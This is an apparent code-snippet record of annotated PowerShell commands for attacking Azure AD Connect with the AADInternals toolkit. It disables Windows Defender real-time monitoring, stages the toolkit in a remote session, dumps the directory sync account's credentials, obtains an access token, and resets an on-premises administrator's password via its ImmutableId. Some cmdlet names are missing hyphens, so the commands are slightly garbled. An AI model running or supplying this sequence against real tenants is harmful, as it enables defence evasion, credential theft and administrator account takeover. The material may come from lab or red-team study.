---
id: a4d7140b-a2bb-433c-b869-3c7cfd111a1d
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:56:16.096704+00:00'
updated_at: '2023-04-10T20:19:32.904100+00:00'
---

# Code Snippet a4d7140b

**Language**: Bash

```bash
PS > Set-MpPreference -DisableRealtimeMonitoring $true

This command is used to disable real-time monitoring of Windows Defender. The argument $true is used to disable the monitoring.

PS > Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents

This command is used to copy the AADInternals.0.4.5.zip file from the specified path to the destination folder. The -ToSession parameter specifies the session to which the copy is made.

PS > Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals

This command is used to extract the contents of the AADInternals.0.4.5.zip file to the specified destination folder.

PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1

This command is used to import the AADInternals module into PowerShell. The module is located in the specified path.

PS > Get-AADIntSyncCredentials

This command is used to retrieve the credentials for the AADIntSync account.

PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache

These commands are used to get a token for the SYNC account and reset the on-prem admin password. The password is set to "Password".

PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId

This command is used to retrieve the ImmutableId of the on-prem admin user.

PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose

This command is used to set the password for the on-prem admin user using the ImmutableId.
```


